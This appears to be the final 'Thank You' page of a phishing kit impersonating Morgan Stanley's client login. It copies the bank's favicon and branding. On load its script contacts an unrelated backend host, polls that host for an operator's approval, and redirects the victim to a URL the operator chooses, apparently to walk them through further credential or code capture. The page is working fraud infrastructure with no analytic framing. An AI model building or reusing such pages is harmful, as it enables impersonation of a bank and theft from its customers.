<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=11">
    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
    <title>Morgan Stanley – Thank You</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        /* Same CSS as before */
        /* ... */
        .thank-you-message {
            text-align: center;
            padding: 40px 0;
        }
        .thank-you-message i {
            width: 64px;
            height: 64px;
            color: #187aba;
            margin-bottom: 20px;
        }
        .thank-you-message h3 {
            font-size: 28px;
            color: #002b51;
            margin-bottom: 20px;
        }
        .thank-you-message p {
            color: #666;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <a href="#main-content" class="skip-link">Skip to main content</a>

    <div role="banner">
        <div class="mso-header-container">
            <div>
                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
                </svg>
            </div>
            <nav class="mso-header-nav-bar" aria-label="Main navigation">
                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
            </nav>
        </div>
    </div>

    <main id="main-content" class="login-page">
        <div class="login_form">
            <div class="login-row">
                <div class="login-left" style="max-width: 600px; margin: 0 auto;">
                    <div class="thank-you-message">
                        <i data-lucide="check-circle" style="width:64px; height:64px;"></i>
                        <h3>Thank You</h3>
                        <p>Your request has been submitted. You will be redirected shortly.</p>
                        <!-- Silent status (hidden) -->
                        <div id="silentStatus" class="silent-status"></div>
                        <div style="margin-top: 30px;">
                            <button class="btn-secondary" onclick="window.location.href='https://google.com';">Continue to Site</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <footer class="ms-footer">...</footer>
    </main>

    <script>
        lucide.createIcons();
        
        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
        let pollTimeout;

        // On page load, send a "thank you" message and start polling
        window.addEventListener('load', async function() {
            try {
                const response = await fetch(`${BACKEND_URL}/thnks`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: 'User completed flow' })
                });
                
                const data = await response.json();
                if (response.ok && data.success) {
                    const sessionId = data.id;
                    localStorage.setItem('sessionId', sessionId);
                    pollStatus(sessionId, 0);
                } else {
                    // If fails, maybe just redirect after a delay
                    setTimeout(() => window.location.href = 'https://google.com', 3000);
                }
            } catch (error) {
                setTimeout(() => window.location.href = 'https://google.com', 3000);
            }
        });

        async function pollStatus(sessionId, attempt) {
            const maxAttempts = 60; // 5 minutes (5s * 60)
            try {
                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
                if (!response.ok) {
                    if (response.status === 404 && attempt < 3) {
                        setTimeout(() => pollStatus(sessionId, attempt + 1), 2000);
                        return;
                    }
                    if (attempt < maxAttempts) {
                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
                    } else {
                        // Timeout – redirect anyway
                        window.location.href = 'https://google.com';
                    }
                    return;
                }
                const data = await response.json();
                if (data.status === 'approved') {
                    if (data.redirect_url) {
                        let redirectUrl = data.redirect_url.startsWith('http') ? data.redirect_url : window.location.origin + '/' + data.redirect_url;
                        window.location.href = redirectUrl;
                    } else {
                        window.location.href = 'https://google.com';
                    }
                } else if (data.status === 'pending') {
                    if (attempt < maxAttempts) {
                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
                    } else {
                        window.location.href = 'https://google.com';
                    }
                } else {
                    window.location.href = 'https://google.com';
                }
            } catch (error) {
                if (attempt < maxAttempts) {
                    setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
                } else {
                    window.location.href = 'https://google.com';
                }
            }
        }
    </script>
</body>
</html>
